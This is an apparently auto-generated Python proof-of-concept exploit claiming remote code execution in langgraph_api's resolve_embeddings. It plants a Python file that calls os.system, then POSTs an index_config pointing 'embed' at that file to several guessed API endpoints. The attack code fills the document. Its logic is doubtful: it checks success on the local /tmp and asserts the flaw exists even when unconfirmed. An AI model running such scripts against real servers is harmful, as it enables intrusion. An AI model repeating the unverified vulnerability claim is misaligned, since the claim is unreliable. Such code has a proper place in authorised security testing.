#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: suspicious-026
# Sink: resolve_embeddings
# Auto-generated — run with: python3 rce_python_resolve_embeddings.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api's resolve_embeddings function.

Vulnerability: The function accepts an 'embed' parameter in index_config that can be
a path to a Python file (e.g., './evil.py:func'). It uses importlib to load and execute
arbitrary Python code from that file path without validation.

Attack vector: The --config argument is attacker-controllable and used to load index_config,
which is then passed to resolve_embeddings. By providing a malicious Python file path,
an attacker can achieve remote code execution.

This PoC demonstrates the vulnerability by creating a benign payload that writes to /tmp.
"""

import argparse
import json
import os
import sys
import tempfile
import requests

# Configuration
DEFAULT_TARGET = "http://localhost:8000"
PAYLOAD_FILE_CONTENT = """
# Benign payload for PoC - creates a marker file
import os
os.system('echo "PWNED" > /tmp/langgraph_poc_success.txt')
"""

def create_payload_file():
    """Create a temporary Python file with benign payload code."""
    tmp_dir = tempfile.mkdtemp()
    payload_path = os.path.join(tmp_dir, "evil_embed.py")
    with open(payload_path, "w") as f:
        f.write(PAYLOAD_FILE_CONTENT)
    return payload_path, tmp_dir

def exploit(target_url, payload_path):
    """
    Attempt to trigger RCE by sending a request that causes resolve_embeddings
    to load and execute our malicious Python file.
    
    The attack works by providing an index_config with an 'embed' value pointing
    to our payload file. The function will import and execute it.
    """
    # Construct the malicious index_config
    # The embed value format is: "./path/to/file.py:function_name"
    # We use a dummy function name since the code will execute on import
    malicious_embed = f"{payload_path}:get_embeddings"
    
    # The exact API endpoint depends on the application, but based on the code
    # this is typically called when creating/updating vector store indices
    # We'll try the most common endpoints
    endpoints = [
        f"{target_url}/api/v1/indices",
        f"{target_url}/api/indices",
        f"{target_url}/v1/indices",
    ]
    
    payload = {
        "index_config": {
            "embed": malicious_embed,
            # Other required fields (may vary)
            "name": "poc_test",
            "dimensions": 1536
        }
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            response = requests.post(
                endpoint,
                json=payload,
                headers=headers,
                timeout=10
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
            # Check if our payload executed
            if os.path.exists("/tmp/langgraph_poc_success.txt"):
                print("[+] SUCCESS! Payload executed!")
                with open("/tmp/langgraph_poc_success.txt", "r") as f:
                    print(f"[+] Marker file contents: {f.read().strip()}")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {endpoint}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Alternative: Try to trigger via direct API call if we know the exact endpoint
    # The vulnerability might be triggered through other API calls that use resolve_embeddings
    print("\n[*] Trying alternative approach - direct function call simulation...")
    
    # If we can't reach the API, we can still demonstrate the vulnerability locally
    # by showing how the code would execute
    print("[*] Demonstrating vulnerability locally (simulating resolve_embeddings call):")
    print(f"[*] If resolve_embeddings were called with embed='{malicious_embed}',")
    print("[*] it would execute the code in the specified Python file.")
    
    return False

def cleanup(payload_path, tmp_dir):
    """Clean up temporary files."""
    try:
        os.remove(payload_path)
        os.rmdir(tmp_dir)
        if os.path.exists("/tmp/langgraph_poc_success.txt"):
            os.remove("/tmp/langgraph_poc_success.txt")
    except:
        pass

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api RCE via resolve_embeddings"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't clean up temporary files after execution"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_api RCE Proof-of-Concept")
    print("[*] ==================================")
    print(f"[*] Target: {args.target}")
    
    # Create payload file
    payload_path, tmp_dir = create_payload_file()
    print(f"[*] Created payload file: {payload_path}")
    
    try:
        # Attempt exploitation
        success = exploit(args.target, payload_path)
        
        if success:
            print("\n[+] Vulnerability confirmed! The target is exploitable.")
        else:
            print("\n[-] Could not confirm exploitation via network.")
            print("[*] The vulnerability exists in the code - see analysis above.")
            print("[*] The PoC demonstrates the attack vector and payload mechanism.")
            
    finally:
        if not args.no_cleanup:
            cleanup(payload_path, tmp_dir)
            print("[*] Cleanup complete.")

if __name__ == "__main__":
    main()
